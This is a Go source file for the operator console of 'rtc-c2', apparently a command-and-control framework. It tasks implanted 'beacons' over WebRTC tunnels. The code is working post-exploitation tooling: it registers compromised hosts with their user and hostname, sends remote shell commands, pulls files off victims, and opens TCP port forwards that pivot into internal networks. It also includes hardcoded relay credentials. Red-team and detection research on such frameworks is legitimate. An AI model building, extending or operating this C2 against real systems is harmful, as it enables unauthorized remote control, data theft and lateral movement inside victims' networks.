// Command operator is the C2 server that tasks beacons through WebRTC tunnels.
// It provides an interactive console for issuing commands and managing forwards.
//
// Direct TCP forward over WebRTC data channels — like SSH -L style
// port forwarding, but encrypted inside WebRTC DTLS.
package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/pion/webrtc/v4"

	"github.com/ek0ms/rtc-c2/pkg/protocol"
	"github.com/ek0ms/rtc-c2/pkg/signaller"
	"github.com/ek0ms/rtc-c2/pkg/transport"
	"github.com/ek0ms/rtc-c2/pkg/tunnel"
)

type BeaconSession struct {
	ID        string
	Hostname  string
	Username  string
	OS        string
	Arch      string
	FirstSeen time.Time
	LastSeen  time.Time
	Peer      *transport.Peer
	Pending   map[string]*protocol.Task
	mu        sync.RWMutex
}

type Operator struct {
	mu            sync.RWMutex
	peer          *transport.Peer
	beaconID      string
	beacons       map[string]*BeaconSession
	sessions      map[string]*BeaconSession
	tunnelBr      *tunnel.Bridge
	sigServer     *signaller.SignallerServer
	forwards      map[string]*tunnel.ForwardListener
	activeBeacon  string // currently selected beacon ID
}

func main() {
	var (
		sigAddr     = flag.String("sig-addr", ":9090", "Signaller listen address")
		sessionKey  = flag.String("session", "rtc-c2-dev", "Session key for signalling")
		operatorID  = flag.String("id", "operator-1", "Operator ID")
		useTURN     = flag.Bool("turn", false, "Use TURN relay")
		wsSignaller = flag.Bool("ws", false, "Use WebSocket signaller instead of HTTP")
	)
	flag.Parse()

	log.SetFlags(log.LstdFlags | log.Lshortfile)

	op := &Operator{
		beacons:  make(map[string]*BeaconSession),
		sessions: make(map[string]*BeaconSession),
		forwards: make(map[string]*tunnel.ForwardListener),
	}

	// --- Start signaller ---
	op.sigServer = signaller.NewSignallerServer(*sigAddr)
	go func() {
		log.Printf("[operator] signaller on %s", *sigAddr)
		if err := op.sigServer.Start(); err != nil {
			log.Printf("[operator] signaller stopped: %v", err)
		}
	}()
	time.Sleep(200 * time.Millisecond)

	// --- Configure transport ---
	cfg := transport.DefaultConfig(transport.RoleOperator)
	cfg.PeerID = *operatorID

	if *useTURN {
		cfg.WithTURN(
			[]string{"turn:127.0.0.1:3478"},
			"rtc-c2",
			"rtc-c2-pass",
		)
	}

	peer, err := transport.NewPeer(cfg)
	if err != nil {
		log.Fatalf("[operator] create peer: %v", err)
	}
	op.peer = peer

	// --- Setup signaller connection ---
	var sig signaller.Signaller
	if *wsSignaller {
		sig = signaller.NewWebSocketSignaller(
			fmt.Sprintf("ws://127.0.0.1%s/ws", *sigAddr),
			*sessionKey, "operator",
		)
		log.Printf("[operator] using WebSocket signaller")
	} else {
		sig = signaller.NewHTTPSignaller(
			fmt.Sprintf("http://127.0.0.1%s", *sigAddr),
			*sessionKey, "operator",
		)
	}

	peer.OnLocalDescription = func(sdp webrtc.SessionDescription) error {
		return sig.SendLocalDescription(sdp)
	}

	// --- Setup tunnel bridge (direct TCP forward) ---
	op.tunnelBr = tunnel.NewBridge()
	op.tunnelBr.OnData = func(tunnelID tunnel.TunnelID, data []byte) {
		env, err := protocol.NewEnvelope(protocol.MsgTunnelData, *operatorID, map[string]interface{}{
			"tunnel_id": string(tunnelID),
			"data":      data,
		})
		if err != nil {
			return
		}
		msg, _ := env.Serialize()
		_ = peer.Send(msg)
	}

	// --- Handle incoming messages ---
	peer.OnMessage(func(data []byte) {
		env, err := protocol.ParseEnvelope(data)
		if err != nil {
			log.Printf("[operator] parse error: %v", err)
			return
		}
		op.handleMessage(env)
	})

	peer.OnStateChange(func(evt transport.PeerEvent) {
		log.Printf("[operator] peer state: %s", evt.State)
	})

	// --- Connect ---
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	log.Printf("[operator] connecting...")
	if err := peer.Connect(ctx); err != nil {
		log.Fatalf("[operator] connect: %v", err)
	}

	log.Printf("[operator] ready — signaller on %s, session: %s", *sigAddr, *sessionKey)
	log.Printf("[operator] beacon connects with: -signaller %s -session %s",
		fmt.Sprintf("http://<this-ip>%s", *sigAddr), *sessionKey)

	// --- Interactive console ---
	go op.console()
	defer op.consoleCleanup()

	// --- Wait for signal ---
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh

	log.Printf("[operator] shutting down")
	for _, fl := range op.forwards {
		fl.Stop()
	}
	peer.Close()
	op.sigServer.Stop()
}

func (op *Operator) handleMessage(env *protocol.Envelope) {
	switch env.Type {
	case protocol.MsgRegister:
		var reg protocol.RegisterPayload
		if err := env.ExtractPayload(&reg); err != nil {
			log.Printf("[operator] extract register: %v", err)
			return
		}
		op.handleRegister(reg)

	case protocol.MsgHeartbeat:
		var hb protocol.HeartbeatPayload
		if err := env.ExtractPayload(&hb); err != nil {
			return
		}
		op.updateHeartbeat(hb)

	case protocol.MsgTaskResult:
		var result protocol.TaskResult
		if err := env.ExtractPayload(&result); err != nil {
			log.Printf("[operator] extract result: %v", err)
			return
		}
		op.handleTaskResult(env.SenderID, &result)

	case protocol.MsgPong:
		// latency measurement

	case protocol.MsgTunnelData:
		var payload struct {
			TunnelID string `json:"tunnel_id"`
			Data     []byte `json:"data"`
		}
		if err := env.ExtractPayload(&payload); err != nil {
			log.Printf("[operator] extract tunnel data: %v", err)
			return
		}

		payloadStr := string(payload.Data)
		if strings.HasPrefix(payloadStr, "OPENED:") {
			log.Printf("[operator] tunnel %s opened -> %s",
				payload.TunnelID, strings.TrimPrefix(payloadStr, "OPENED:"))
		} else if payloadStr == "CLOSED" {
			op.tunnelBr.CloseTunnel(tunnel.TunnelID(payload.TunnelID))
		} else {
			op.tunnelBr.HandleData(tunnel.TunnelID(payload.TunnelID), payload.Data)
		}

	case protocol.MsgError:
		var errPayload protocol.ErrorPayload
		if err := env.ExtractPayload(&errPayload); err == nil {
			log.Printf("[operator] error from beacon: %s", errPayload.Message)
		}

	default:
		log.Printf("[operator] unknown message type: %s", env.Type)
	}
}

func (op *Operator) handleRegister(reg protocol.RegisterPayload) {
	op.mu.Lock()
	defer op.mu.Unlock()

	now := time.Now()
	beaconID := reg.BeaconID

	if existing, ok := op.beacons[beaconID]; ok {
		existing.LastSeen = now
		existing.Hostname = reg.Hostname
		existing.Username = reg.Username
		existing.OS = reg.OS
		existing.Arch = reg.Arch
		log.Printf("[operator] beacon %s re-registered", beaconID)
		return
	}

	session := &BeaconSession{
		ID:        beaconID,
		Hostname:  reg.Hostname,
		Username:  reg.Username,
		OS:        reg.OS,
		Arch:      reg.Arch,
		FirstSeen: now,
		LastSeen:  now,
		Pending:   make(map[string]*protocol.Task),
	}

	op.beacons[beaconID] = session
	op.sessions[beaconID] = session

	log.Printf("[operator] beacon registered: %s (%s@%s) %s/%s",
		beaconID, reg.Username, reg.Hostname, reg.OS, reg.Arch)
	fmt.Printf("\n[+] Beacon connected: %s — %s@%s (%s/%s)\n> ",
		beaconID[:12], reg.Username, reg.Hostname, reg.OS, reg.Arch)
}

func (op *Operator) updateHeartbeat(hb protocol.HeartbeatPayload) {
	op.mu.RLock()
	session, ok := op.beacons[hb.BeaconID]
	op.mu.RUnlock()

	if !ok {
		return
	}

	session.mu.Lock()
	session.LastSeen = time.Now()
	session.mu.Unlock()
}

func (op *Operator) handleTaskResult(beaconID string, result *protocol.TaskResult) {
	op.mu.RLock()
	session, ok := op.beacons[beaconID]
	op.mu.RUnlock()

	if !ok {
		log.Printf("[operator] result from unknown beacon: %s", beaconID)
		return
	}

	session.mu.Lock()
	delete(session.Pending, result.TaskID)
	session.mu.Unlock()

	status := "✓"
	if !result.Success {
		status = "✗"
	}

	fmt.Printf("\n[%s] Task %s %s (exit: %d, %dms)\n",
		beaconID[:12], result.TaskID[:8], status, result.ExitCode, result.Duration)
	if result.Output != "" {
		fmt.Printf("%s\n", result.Output)
	}
	if result.Error != "" {
		fmt.Printf("Error: %s\n", result.Error)
	}
	fmt.Print("> ")
}

func (op *Operator) sendTask(beaconID string, task *protocol.Task) error {
	op.mu.RLock()
	session, ok := op.beacons[beaconID]
	op.mu.RUnlock()

	if !ok {
		return fmt.Errorf("beacon %s not connected", beaconID)
	}

	env, err := protocol.NewEnvelope(protocol.MsgTask, op.peer.Config().PeerID, task)
	if err != nil {
		return fmt.Errorf("create envelope: %w", err)
	}

	msg, err := env.Serialize()
	if err != nil {
		return fmt.Errorf("serialize: %w", err)
	}

	session.mu.Lock()
	session.Pending[task.ID] = task
	session.mu.Unlock()

	return op.peer.Send(msg)
}

// --- Console ---

func (op *Operator) console() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Println("\n=== rtc-c2 Operator Console ===")
	fmt.Println("Commands: beacons, use <id>, forward <local:port> <remote:port>,")
	fmt.Println("          forwards, stop-forward <local>, exec <cmd>, download <path>,")
	fmt.Println("          info, help, exit")
	fmt.Print("> ")

	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			return
		}

		line = strings.TrimSpace(line)
		if line == "" {
			fmt.Print("> ")
			continue
		}

		parts := strings.SplitN(line, " ", 2)
		cmd := strings.ToLower(parts[0])

		switch cmd {
		case "exit", "quit":
			fmt.Println("shutting down...")
			return

		case "help":
			printHelp()

		case "beacons", "list":
			op.listBeacons()

		case "use":
			if len(parts) < 2 {
				fmt.Println("usage: use <beacon-id>")
				break
			}
			beaconID := strings.TrimSpace(parts[1])
			op.activeBeacon = beaconID
			op.useBeacon(beaconID, reader)

		case "forward":
			if len(parts) < 2 {
				fmt.Println("usage: forward <local:port> <remote:port>")
				fmt.Println("  forward 127.0.0.1:4444 10.0.1.100:80")
				fmt.Println("  forward :8080 internal.service:443")
				break
			}
			args := strings.Fields(parts[1])
			if len(args) < 2 {
				fmt.Println("usage: forward <local> <remote>")
				break
			}
			op.startForward(args[0], args[1])

		case "forwards":
			op.listForwards()

		case "stop-forward":
			if len(parts) < 2 {
				fmt.Println("usage: stop-forward <local-addr>")
				break
			}
			op.stopForward(strings.TrimSpace(parts[1]))

		case "socks":
			fmt.Println("'socks' removed — use 'forward' for direct TCP forwarding")

		default:
			fmt.Printf("unknown command: %s (try 'help')\n", cmd)
		}

		fmt.Print("> ")
	}
}

func (op *Operator) startForward(localAddr, remoteAddr string) {
	// Ensure local addr has a port
	if !strings.Contains(localAddr, ":") {
		fmt.Printf("bad local addr: %s (need host:port)\n", localAddr)
		return
	}
	if !strings.Contains(remoteAddr, ":") {
		fmt.Printf("bad remote addr: %s (need host:port)\n", remoteAddr)
		return
	}

	// Prepend 127.0.0.1 if no explicit host
	if strings.HasPrefix(localAddr, ":") {
		localAddr = "127.0.0.1" + localAddr
	}

	fl, err := op.tunnelBr.StartForwardListener(localAddr, remoteAddr)
	if err != nil {
		fmt.Printf("forward error: %v\n", err)
		return
	}

	op.mu.Lock()
	op.forwards[localAddr] = fl
	op.mu.Unlock()

	fmt.Printf("[+] Forward: %s -> %s (via active beacon)\n", localAddr, remoteAddr)
}

func (op *Operator) listForwards() {
	op.mu.RLock()
	defer op.mu.RUnlock()

	if len(op.forwards) == 0 {
		fmt.Println("No active forwards")
		return
	}

	fmt.Println("Active forwards:")
	for local, fl := range op.forwards {
		fmt.Printf("  %s -> %s (via beacon)\n", local, fl.TargetAddr)
	}
}

func (op *Operator) stopForward(localAddr string) {
	op.mu.Lock()
	fl, ok := op.forwards[localAddr]
	delete(op.forwards, localAddr)
	op.mu.Unlock()

	if !ok {
		fmt.Printf("no forward on %s\n", localAddr)
		return
	}

	fl.Stop()
	fmt.Printf("[-] Forward stopped: %s\n", localAddr)
}

func (op *Operator) useBeacon(beaconID string, reader *bufio.Reader) {
	op.mu.RLock()
	session, ok := op.beacons[beaconID]
	op.mu.RUnlock()

	if !ok {
		// Try prefix match
		for id, s := range op.beacons {
			if len(id) >= len(beaconID) && id[:len(beaconID)] == beaconID {
				session = s
				beaconID = id
				ok = true
				break
			}
		}
	}

	if !ok {
		fmt.Printf("beacon '%s' not found\n", beaconID)
		return
	}

	op.activeBeacon = beaconID
	fmt.Printf("[+] Using beacon %s (%s@%s)\n", beaconID[:12], session.Username, session.Hostname)
	fmt.Println("    Commands: exec <cmd>, info, download <path>, whoami, back")
	fmt.Print("    > ")

	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			return
		}

		line = strings.TrimSpace(line)
		if line == "" {
			fmt.Print("    > ")
			continue
		}

		if line == "back" || line == "exit" {
			return
		}

		parts := strings.SplitN(line, " ", 2)
		subCmd := strings.ToLower(parts[0])

		switch subCmd {
		case "exec", "run":
			if len(parts) < 2 {
				fmt.Println("usage: exec <command>")
				break
			}
			cmdName := strings.TrimSpace(parts[1])
			go func() {
				task, err := protocol.NewTask(protocol.TaskExec, &protocol.ExecArgs{
					Command: cmdName,
				})
				if err != nil {
					fmt.Printf("create task error: %v\n", err)
					return
				}
				if err := op.sendTask(beaconID, task); err != nil {
					fmt.Printf("send task error: %v\n", err)
					return
				}
				fmt.Printf("[*] Task %s sent to %s\n", task.ID[:8], beaconID[:12])
			}()

		case "info":
			task, _ := protocol.NewTask(protocol.TaskInfo, nil)
			_ = op.sendTask(beaconID, task)
			fmt.Printf("[*] Info request sent\n")

		case "whoami":
			task, _ := protocol.NewTask(protocol.TaskWhoami, nil)
			_ = op.sendTask(beaconID, task)
			fmt.Printf("[*] Whoami request sent\n")

		case "download":
			if len(parts) < 2 {
				fmt.Println("usage: download <path>")
				break
			}
			path := strings.TrimSpace(parts[1])
			task, err := protocol.NewTask(protocol.TaskDownload, &protocol.DownloadArgs{
				RemotePath: path,
			})
			if err != nil {
				fmt.Printf("error: %v\n", err)
				break
			}
			_ = op.sendTask(beaconID, task)
			fmt.Printf("[*] Download request for %s sent\n", path)

		default:
			fmt.Println("commands: exec <cmd>, info, whoami, download <path>, back")
		}

		fmt.Print("    > ")
	}
}

func (op *Operator) listBeacons() {
	op.mu.RLock()
	defer op.mu.RUnlock()

	if len(op.beacons) == 0 {
		fmt.Println("No beacons connected. Waiting...")
		return
	}

	fmt.Printf("Connected beacons (%d):\n", len(op.beacons))
	fmt.Println(strings.Repeat("-", 60))
	fmt.Printf("%-24s %-16s %-8s %-8s\n", "Beacon ID", "User@Host", "OS", "Arch")
	fmt.Println(strings.Repeat("-", 60))

	for _, s := range op.beacons {
		id := s.ID
		if len(id) > 12 {
			id = id[:12] + "..."
		}
		userHost := fmt.Sprintf("%s@%s", s.Username, s.Hostname)
		fmt.Printf("%-24s %-16s %-8s %-8s\n", id, userHost, s.OS, s.Arch)
	}
}

func printHelp() {
	fmt.Print(`
Commands:
  beacons                    List connected beacons
  use <id>                   Interactive beacon session
  forward <local> <remote>   Direct TCP forward (SSH -L style)
                             Example: forward 127.0.0.1:4444 10.0.1.100:80
  forwards                   List active forwards
  stop-forward <local>       Stop a forward listener
  help                       Show this help
  exit                       Shut down

Beacon session commands:
  exec <cmd>                 Run command on beacon
  info                       Get system info
  whoami                     Get user identity
  download <path>            Download file from beacon
  back                       Return to main menu

  Example: forward 127.0.0.1:4444 internal.service:80
           curl http://127.0.0.1:4444/path
`)
}

func (op *Operator) consoleCleanup() {
	fmt.Print("\nShutting down...\n")
}
